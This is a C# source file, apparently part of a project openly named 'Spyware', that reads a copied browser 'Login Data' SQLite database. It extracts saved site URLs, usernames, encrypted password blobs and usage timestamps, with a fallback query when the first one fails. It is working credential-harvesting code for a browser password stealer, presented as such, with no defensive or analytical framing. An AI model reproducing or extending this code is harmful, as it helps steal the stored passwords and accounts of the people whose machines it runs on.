using Microsoft.Data.Sqlite;
using Spyware.Core.Logging;

namespace Spyware.Collectors.Browsers;

public sealed record LoginRow(
    string OriginUrl, string Username, byte[]? PasswordBlob,
    long? DateCreated, long? DateLastUsed, int TimesUsed);

/// <summary>Abre la COPIA de Login Data; nunca abre el archivo del navegador.</summary>
public static class SqliteReader
{
    private const string QueryModern = """
        SELECT origin_url, username_value, password_value, date_created,
               date_last_used, times_used
        FROM logins
        WHERE blacklisted_by_user = 0
        ORDER BY date_created DESC
        LIMIT $limit;
        """;

    private const string QueryFallback = """
        SELECT origin_url, username_value, password_value, date_created,
               date_last_used, 0
        FROM logins
        ORDER BY date_created DESC
        LIMIT $limit;
        """;

    public static IReadOnlyList<LoginRow> Read(string databasePath, int maxResults, ILog log)
    {
        try
        {
            return Query(databasePath, QueryModern, maxResults);
        }
        catch (SqliteException ex)
        {
            log.Debug("Consulta moderna falló (" + ex.Message + "); se reintenta sin filtro.");
            return Query(databasePath, QueryFallback, maxResults);
        }
    }

    private static IReadOnlyList<LoginRow> Query(string databasePath, string sql, int maxResults)
    {
        var rows = new List<LoginRow>();

        using var connection = new SqliteConnection($"Data Source={databasePath};Pooling=False;");
        connection.Open();

        using SqliteCommand command = connection.CreateCommand();
        command.CommandText = "PRAGMA busy_timeout = 5000;";
        command.ExecuteNonQuery();

        command.CommandText = sql;
        command.Parameters.AddWithValue("$limit", Math.Max(1, maxResults));

        using SqliteDataReader reader = command.ExecuteReader();
        while (reader.Read())
        {
            rows.Add(new LoginRow(
                reader.IsDBNull(0) ? string.Empty : reader.GetString(0),
                reader.IsDBNull(1) ? string.Empty : reader.GetString(1),
                ReadBlob(reader, 2),
                reader.IsDBNull(3) ? null : reader.GetInt64(3),
                reader.IsDBNull(4) ? null : reader.GetInt64(4),
                reader.IsDBNull(5) ? 0 : Convert.ToInt32(reader.GetValue(5))));
        }

        return rows;
    }

    private static byte[]? ReadBlob(SqliteDataReader reader, int ordinal)
    {
        if (reader.IsDBNull(ordinal)) return null;

        try { return reader.GetFieldValue<byte[]>(ordinal); }
        catch (InvalidCastException)
        {
            using var stream = reader.GetStream(ordinal);
            using var ms = new MemoryStream();
            stream.CopyTo(ms);
            return ms.ToArray();
        }
    }
}
